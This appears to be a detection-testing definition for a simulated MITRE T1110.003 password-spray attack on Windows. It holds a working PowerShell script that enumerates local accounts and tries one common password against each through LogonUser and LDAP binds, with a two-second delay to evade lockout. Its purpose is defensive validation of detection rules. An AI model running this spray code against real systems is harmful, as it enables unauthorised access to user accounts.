id: T1110.003
name: Password Spraying
description: Simulates password spraying — one password across many accounts — using LogonUser API and LDAP DirectoryEntry bind. The 2-second inter-attempt delay is critical to match the spray timing that avoids lockout policies. The pattern (same password, many accounts) is the inverted signal from brute force that Exabeam's one dedicated spray rule detects.
tactic: credential-access
technique_id: T1110.003
platform: windows
phase: attack
elevation_required: false
expected_events:
  - "4625 (Failed logon - same SubStatus=0xC000006A across many different TargetUserName values)"
  - "4771 (Kerberos pre-auth failed — in AD environments, one per user)"
  - "4688 (powershell.exe process creation)"
tags:
  - credential-access
  - no-prereqs
  - ueba-spray
executor:
  type: powershell
  command: |-
    Write-Host "[T1110.003] Password Spraying — single password across all local accounts"

    $sprayPassword = "Spring2024!"

    # Get real local usernames for authentic spray targets
    $users = (Get-LocalUser -ErrorAction SilentlyContinue | Where-Object Enabled -eq $true).Name
    if (-not $users) { $users = @($env:USERNAME, "Administrator", "Guest") }
    Write-Host "Spray targets: $($users.Count) enabled local accounts"
    Write-Host "Spray password: $sprayPassword (designed to fail — safe simulation)"

    # LogonUser API spray (EID 4625 LogonType=2 per account)
    Write-Host "--- LogonUser spray (EID 4625 - same password, different users) ---"
    $sig = '[DllImport("advapi32.dll",SetLastError=true)] public static extern bool LogonUser(string u,string d,string p,int t,int prov,out IntPtr h); [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);'
    Add-Type -MemberDefinition $sig -Name SprayAuth -Namespace LNJ03
    foreach ($user in $users) {
        $token = [IntPtr]::Zero
        $ok = [LNJ03.SprayAuth]::LogonUser($user, $env:COMPUTERNAME, $sprayPassword, 3, 0, [ref]$token)
        if ($ok) {
            Write-Host "  VALID: $user / $sprayPassword"
            [LNJ03.SprayAuth]::CloseHandle($token) | Out-Null
        } else {
            Write-Host "  Invalid: $user"
        }
        Start-Sleep -Seconds 2  # 2-second delay = avoids lockout, matches real spray timing
    }

    # LDAP-based spray (AD environment) — generates EID 4625 on DC with LogonType=3
    Write-Host "--- LDAP spray (AD — EID 4625 on DC, EID 4771 Kerberos pre-auth failed) ---"
    $sprayDomain = $env:USERDNSDOMAIN
    if ($sprayDomain) {
        foreach ($user in ($users | Select-Object -First 3)) {
            try {
                $entry = New-Object System.DirectoryServices.DirectoryEntry(
                    "LDAP://$sprayDomain", "$sprayDomain\$user", $sprayPassword)
                $null = $entry.NativeObject
                Write-Host "  LDAP VALID: $user"
            } catch {
                Write-Host "  LDAP Invalid: $user"
            }
            Start-Sleep -Seconds 2
        }
    } else {
        Write-Host "  LDAP spray skipped (not domain-joined)"
    }

    Write-Host "[T1110.003] Complete. EID 4625 pattern: same SubStatus, different TargetUserName = spray indicator."
cleanup: ""
